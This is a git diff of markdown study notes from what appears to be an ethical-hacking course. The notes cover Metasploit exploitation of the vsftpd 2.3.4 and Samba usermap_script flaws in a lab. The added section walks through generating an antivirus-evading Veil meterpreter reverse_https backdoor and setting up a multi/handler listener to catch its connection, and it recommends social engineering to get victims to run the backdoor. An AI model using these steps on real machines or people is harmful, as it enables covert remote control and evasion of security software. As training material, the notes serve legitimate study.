@@ -558,14 +558,14 @@ Any device connected to it will be victim of MITM attack
 
 # Gaining Access to Computer devices
 any electronic device <br>
-**Server Side Attacks**
+- **Server Side Attacks**
 - Do not require user interaction, all we need is a target IP
 - starts with information gathering, find open ports, installed services and work from there
 - mostly applies to webserver, application and device that are not get used much by users
-**Client Side Attacks**
+- **Client Side Attacks**:
 - Require user interaction, such as opening a file, a links
 - information gathering is key here, create a trojan and use social engineering to get the target to run it
-**Post exploitation**
+- **Post exploitation**
 - what can be done after gaining Access
 
 # Gaining Access - Server Side Attacks
@@ -583,6 +583,7 @@ any electronic device <br>
   - password : msfadmin
   - to shoutdown -> sudo poweroff
 - run metasploitable webserver in same network with it's IP address
+- Netowrk configuration as NATNetwork
 
 ## Introduction : Server side Attacks
 - Need an IP address.
@@ -617,7 +618,7 @@ identification and post exploitation tasks.
 - example:
 ```
 # we went to zenmap, found the service vsftpd v2.3.4 and googled it
-# we found a vulnerability at rapid7.com as :
+# we found a vulnerability at https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor as :
 ## VSFTPD V2.3.4 BACKDOOR COMMAND EXECUTION
 ## MODULE NAME : exploit/unix/ftp/vsftpd_234_backdoor
 # now run msfconsole
@@ -634,7 +635,7 @@ msf exploit(vsftpd_234_backdoor) > exploit
 - LHOST is usually hacker machine, to where the request is transferred
 - Payloads are small piece of code that are executed on target machine once the vulnerability is exploited, payload will further do something to do something like gaining control
 - **payload example**: for samba 3.x exploit ->
-- SAMBA "USERNAME MAP SCRIPT" COMMAND EXECUTION
+- SAMBA "USERNAME MAP SC  RIPT" COMMAND EXECUTION
 ```
 msf > use exploit/multi/samba/usermap_script
 msf exploit(usermap_script) > show options
@@ -707,3 +708,85 @@ Nexpose is a vulnerability management framework,
     - you can sort based on risk factor
   - shoes solutions to fix
   - different level of reports can be generated
+
+
+# Gaining Access - Client Side Attacks
+
+## Introduction : Client side Attacks
+- Use if server side attacks fail OR If IP is probably useless
+- if target is hidden behind a router
+- it Require user interaction (open a link, picture, pdf etc)
+- Social engineering can be very useful
+- Information gathering is vital (not only the services, but websites used by target, email, friends etc)
+
+## Client side Attacks : Installing Veil Framework
+- a backdoor is a file that gives us full control over the machine that it gets executed on
+- backdoor can be caught by anti-virus programs
+- Viel is framework for generating *Undetectable* backdoors
+- https://github.com/Veil-Framework/Veil
+
+**Generating an undetectable backdoor using - Veil-Evasion** <br>
+1. Install veil-evasion > apt-get install veil-evasion  
+  - (on install *apt-get install veil*-> it has two tools evasion and Ordance)
+  1. Evasion : generates backdoors
+  2. Ordance : Generate Payloads
+2. Run veil-evasion > veil-evasion
+  - (or run *veil* > list > 1) Evasion)
+3. Select a backdoor/payload > use [payload number]
+  - command to see available payloads > list
+4. Set options > set [option] [value]
+5. Generate backdoor > generate
+- INFO:
+  - Payloads are divided into 3 parts: FIRST/SECOND/THIRD   (General naming patterns)
+    1. FIRST: Programming language payloads is written in
+    2. SECOND: type of the payload  
+      - ex: meterpreter: payload designed my metasploit, it runs in memory and allow us to migrate between system processes, ex: explorer. it doesn't leave a footprint so hard to detect
+    3. THIRD: method that's gonna be used to establish the connection
+      - ex: rev_https.py : creates reverse https connection
+      - reverse: connection is gonna come from target computer to hacker computer
+      - able to bypass firewall/anti-virus in reverse connection
+- Example:
+```
+> Veil
+> list    -------> choose 1
+> list    -------> choose 15 (go/meterpreter/rev_https.py)
+# it will show payload info and options
+# LHOST and LPORT is the ip address and port we'll be listening connection on . i.e. our computer ip
+> set LHOST 10.0.2.14            ---->IP_ADDR_HACKER_MACHINE
+> set LPORT 8080    ------->PORT_HACKER_MACHINE
+## They way anti-virus programs work is that they have a very large database of signatures corresponds to file that contains harmful code . for ex: backdoors
+## to change the signature we try to modify the backdoor file as much as possible to make it unique by updating it's parameters to bypass signature database
+## you can set optional parameters
+> set PROCESSORS 1    ------>(doesn't make much difference)
+> set SLEEP 6     ----->(doesn't make much difference)
+> generate -------> give name the backdoor. ex: rev_https_8080
+# it will result the back of backdoor file as .exe
+# metasploit RC file can be directly loaded in future for use
+## you can verify you backdoor's signature if it can bypass anti-virus programs at:
+> scan the file at https://nodistribute.com
+> or https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/
+# keep veil up to date
+# Start listening to connections before sending backdoor
+```
+
+**Listening for connections** <br>
+For above backdoor to work, we need to open a port to listen any connection on that port
+- we'll use metasploit framework to listen connections
+1. Run metasploit > msfconsole
+2. Use handler module. > use exploit/multi/handler
+3. Set payload > set PAYLOAD [veil payload]   --- TARGET/TYPE/METHOD
+4. Set ip > set LHOST [your ip]
+5. Set port > set LPORT [veil port]
+6. exploit > exploit
+- example:
+```
+$ msfconsole
+> use exploit/multi/handler
+> set PAYLOAD windows/meterpreter/reverse_https
+> show options
+> set LHOST 10.0.2.14    
+> set LPORT 8080    ---->(on 80, we'll running our webserver to deliver backdoor)
+> exploit
+```
+
+## Basic Backdoor delivery method : WINDOWS 10
